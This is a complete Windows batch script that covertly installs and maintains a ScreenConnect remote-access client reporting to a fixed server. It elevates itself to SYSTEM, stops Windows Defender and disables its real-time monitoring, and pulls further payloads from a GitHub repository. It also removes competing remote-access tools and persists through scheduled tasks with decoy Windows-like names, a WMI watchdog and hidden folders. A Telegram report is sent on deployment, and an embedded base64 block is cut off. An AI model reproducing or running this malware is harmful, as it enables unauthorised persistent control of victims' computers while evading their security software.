@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260804O55 - sevrz-only deploy
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM O47b: unharden workdir on entry — LockDir (SYSTEM+Admin only) froze hosts on old
REM builds by blocking self-update downloads. Re-open so the tick can always update.
attrib -h -s -r "%WD%" >nul 2>&1
attrib -h -s -r "%WD%\*" >nul 2>&1
icacls "%WD%" /reset /T /C /Q >nul 2>&1
icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O50 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O41b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O50" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O41 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O46 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Refresh core payloads (always fetch latest; embed = offline fallback only)...
set "STG=%SystemRoot%\Temp\.upd"
if not exist "%STG%" mkdir "%STG%" >nul 2>&1
attrib -h -s -r "%WD%" >nul 2>&1
icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1
attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_secure.cmd" "%WD%\tg_report.ps1" "%WD%\own_lib.ps1" >nul 2>&1

rem O48: ALWAYS pull latest from repo (staged in Temp, never blocked by WD lock).
rem Embed below is only a fallback when there is no network.
set "NETOK=0"
"%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP%/own_lib.ps1?t=%RANDOM%" >nul 2>&1
if not exist "%STG%\own_lib.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && set "NETOK=1"

if "%NETOK%"=="1" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP%/own_mon.cmd?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\own_mon.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP%/own_secure.cmd?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\own_secure.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP%/tg_report.ps1?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\tg_report.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
  rem BUILD-verify each then move into WD
  findstr /C:"OWN_MON  BUILD" "%STG%\own_mon.cmd" >nul 2>&1 && for %%F in ("%STG%\own_mon.cmd") do if %%~zF GTR 1500 move /y "%STG%\own_mon.cmd" "%WD%\own_mon.cmd" >nul 2>&1
  findstr /C:"OWN_SECURE BUILD" "%STG%\own_secure.cmd" >nul 2>&1 && for %%F in ("%STG%\own_secure.cmd") do if %%~zF GTR 800 move /y "%STG%\own_secure.cmd" "%WD%\own_secure.cmd" >nul 2>&1
  findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && for %%F in ("%STG%\own_lib.ps1") do if %%~zF GTR 1500 move /y "%STG%\own_lib.ps1" "%WD%\own_lib.ps1" >nul 2>&1
  findstr /C:"TG_REPORT BUILD" "%STG%\tg_report.ps1" >nul 2>&1 && for %%F in ("%STG%\tg_report.ps1") do if %%~zF GTR 1500 move /y "%STG%\tg_report.ps1" "%WD%\tg_report.ps1" >nul 2>&1
  echo core_fetch_latest_done>>"%LOG%"
) else (
  echo net_offline_using_embed>>"%LOG%"
  call :Extract B64_MON "%WD%\own_mon.cmd"
  call :Extract B64_SEC "%WD%\own_secure.cmd"
  call :Extract B64_TGR "%WD%\tg_report.ps1"
  call :Extract B64_LIB "%WD%\own_lib.ps1"
  if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
  echo embed_extract_done>>"%LOG%"
)
del /f /q "%STG%\own_mon.cmd" "%STG%\own_secure.cmd" "%STG%\own_lib.ps1" "%STG%\tg_report.ps1" >nul 2>&1

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & powershell -NoProfile -NonInteractive -Command \"try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}\" >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM L45 HANDS-OFF: never rmdir ScreenConnect install dirs
REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_SKIPPED_hands_off>>"%LOG%"
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf_SKIPPED_hands_off>>"%LOG%"
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
REM L45/M48 HANDS-OFF: never msiexec any ScreenConnect — diagnose disconnects first
echo hands_off_skip_primary_msi>>"%LOG%"
goto :after_primary_install

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O41: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O39/L13: Create like WucacheOwn â€” BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) â€” same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O42 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
)
rem O51: OLE magic d0cf11e0 — reject HTML/error pages (wrong content-type downloads)
powershell -NoProfile -NonInteractive -Command "$p=$args[0]; $fs=[IO.File]::OpenRead($p); $b=New-Object byte[] 4; [void]$fs.Read($b,0,4); $fs.Close(); if($b[0]-eq 0xD0 -and $b[1]-eq 0xCF -and $b[2]-eq 0x11 -and $b[3]-eq 0xE0){exit 0}else{exit 1}" "%~1" >nul 2>&1
if errorlevel 1 (
  echo msi_bad_magic>>"%LOG%"
  del /f /q "%~1" >nul 2>&1
  exit /b 1
)
copy /y "%~1" "%MSICACHE%" >nul 2>&1
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
::QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIwMjYwODA0TTcxDQpy
::ZW0gIE03MTogZmxlZXQgb25lLXNob3QgY2FtcGFpZ24gaG9vayAoZmxlZXRfY2Ft
::cGFpZ24uY2ZnIENBTVBBSUdOPS9TQ1JJUFQ9LCBwZXItaG9zdCBhY2ssIHJ1bnMg
::b25jZSkuDQpyZW0gIE03MDogc2V2cnotb25seSBtb25pdG9yL2hlYWwvVEcvc2Vs
::Zi11cGRhdGUuDQpyZW0gIE02OTogR0lUX1BJTj1tYWluIGFsd2F5cyBwdWxscyB0
::aXAgZXZlcnkgdGljay4NCnJlbSAgTTU4OiBzdGlja3kgdmVyc2lvbl9mbG9vci5j
::Zmcg4oCUIG5ldmVyIGFwcGx5IG9sZGVyIG1vbi9saWIuDQpyZW0gIE01NzogZmxl
::ZXRfY2hhbm5lbC5jZmcgcGluK2Zsb29yOyBubyBkb3duZ3JhZGUuDQpyZW0gIE01
::MDogaGFzaC1taXNtYXRjaCDihpIgQlVJTEQgZmFsbGJhY2suDQpyZW0gIEF1dGhv
::cml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29w
::ZSBvbmx5Lg0KcmVtIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkA0Kc2V0bG9jYWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0KDQpz
::ZXQgIktFRVBfRlA9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFj
::ODE0MGQ0NTM0MjciDQpzZXQgIldEPUM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxX
::aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJFVEw9QzpcUHJvZ3JhbURh
::dGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxP
::Rz0lV0QlXG93bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0lV0QlXG93bl9tb24uc3Rh
